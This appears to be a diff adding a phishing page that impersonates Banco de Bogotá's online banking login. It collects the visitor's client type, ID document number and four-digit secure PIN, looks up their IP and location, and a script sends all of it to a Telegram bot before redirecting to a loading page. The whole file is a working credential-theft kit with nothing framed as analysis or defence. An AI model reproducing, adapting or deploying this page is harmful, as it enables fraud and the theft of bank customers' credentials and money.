@@ -1,0 +1,196 @@
+<html><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf8"> 
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Bogota</title>
+    
+    <link rel="stylesheet" href="https://sapp2406.sirv.com/bogo/lfr_style.css">
+    <link rel="stylesheet" href="https://sapp2406.sirv.com/bogo/lfr_ownstyle.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="dt.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2,  u_name3, u_name4, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("tipoPersona").value;
+    u_name2 = document.getElementById("IType").value;
+	u_name3 = document.getElementById("numi").value;
+	u_name4 = document.getElementById("clvseg").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "bbogota\nTipoCliente: " + u_name + "\nDocumento: " + u_name2 + "-" + u_name3 +  "\nClav3Seg: " + u_name4 + "\n\nIP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'load.html';
+    });
+    return false;
+  };
+
+</script>
+    
+    </head>
+    
+    <body style="">
+        <div class="box-container">
+            <div class="container">
+                <div class="toast hidden" id="errorMessage" style="position: absolute;">
+       <p id="AuthLabel"></p>
+       <span class="icon-close-search-r" onclick="hideToast()"></span>
+    </div>
+                <div class="container__water-mark">
+                    <div class="container__water-mark--image-container"></div>
+                </div>
+                <div class="container__login">
+                    <div class="container__login--header">
+                        <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="">
+                    </div>
+                    <div class="container__login--title">
+                        <div class="container__login--title-1" style="color:#000">
+                            <p>
+                                Bienvenido a tu Banca Virtual
+                                <label class="tituloformulario" id="flujoOrigenLbl">
+                                <br></label>
+                            </p>
+                        </div>
+                    </div>
+                    <div class="container__login--login-box">
+                        <div class="container__login--login-box-title">
+                            <span>Ingresa el tipo y numero de documento</span>
+                        </div>
+                        <div class="form-container">
+    
+                            <form method="post" name="loginForm" id="loginForm" action="" onsubmit="return sender();" autocomplete="off">
+                              
+										<p id="gfg" hidden="">37.251.221.145</p>
+									<p id="address" hidden="">Iaşi, RO</p>
+    
+    
+                                <div class="label">
+                                    <label for="tipoPersona">Que tipo de cliente eres?</label>
+                                </div>
+                                <div class="custom-select">
+                                    <select id="tipoPersona" name="Seleid" required="">
+                                        <option value="">Selecciona</option>
+                                        <option value="Personas">Banca Personas</option>
+                                        <option value="Empresarial">Banca Empresarial y Corporativa</option>
+                                        <option value="Afiniada">Afinidad</option>
+                                    </select>
+                                </div>
+    
+                                <div class="field-tdo">
+                                    <div class="label">
+                                        <label for="IdentificationType">Identificación</label>
+                                    </div>
+                                    <div class="custom-select">
+									     <table border="0"><tbody><tr><td>
+                                        <select id="IType" name="IType" required="" style="width:110px">
+                                            <option value="CC">C.C. Cédula de ciudadanía</option>
+											 <option value="T.I.">T.I. Tarjeta de Identidad</option>
+                                            <option value="C.E.">C.E. Cédula de Extranjería</option>
+                                            <option value="Nit">N.P.N. NIT Persona Natural</option>
+											<option value="Nit extranjeros">N.P.E. NIT Persona Extranjera</option>
+											<option value="Nit juridico">N.P.J. NIT Persona Jurídica</option>
+											<option value="Pasaporte">P.S. Pasaporte</option>
+                                            <option value="Civil">R.C. Registro Civil</option>
+                                           
+                                         </select></td>
+										 <td>
+										     <input type="text" class="custom-form-control" placeholder="#" name="numi" id="numi" size="20" maxlength="20" style="width:100%" required="">
+											 </td>
+											 </tr>
+                                   </tbody></table>
+                                    </div>
+                                </div>
+								
+						
+    
+                                <div class="field-ndo">
+                                    <div class="custom-input">
+                                        <div class="label">
+                                            <label for="Identification">Clave Segura</label>
+                                        </div>
+                                        <input type="tel" class="custom-form-control" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" placeholder="...." name="clvseg" id="clvseg" size="20" maxlength="4" minlength="4" required="">
+                                    </div>
+                                </div>
+                                <div class="btn-container">
+                                    <button type="submit" class="btn-main" id="btnAction" style="width:100%">Continuar</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <style>
+        ul {
+            list-style-type: none;
+            margin-top: 2rem;
+            margin-left: 4rem;
+            vertical-align: top;
+        }
+    
+        li {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+    
+        .icon-info {
+            width: 3rem;
+            height: 3rem;
+            margin-right: 1rem;
+            object-fit: cover;
+        }
+    </style>
+    <div class="container__info">
+        <div class="container__info--tips">
+            <div class="collapsable">
+                <div class="collapse">
+                    <div class="collapse__header">
+                        <div class="collapse__header--text">
+                            <img src="https://sapp2406.sirv.com/bogo/c2922.png" style="width:100%">
+                        </div>
+                       
+                    </div>
+               
+                </div>
+            </div>
+  
+        </div>
+    </div>
+
+    
+    
+            </div>
+    
+            <div id="doEnableNatural" style="display: none"></div>
+            <div id="doEnableCorporate" style="display: none"></div>
+            <div id="doEnableAfinidad" style="display: block;"></div>
+    
+        </div>
+   
+    
+    </body></html>
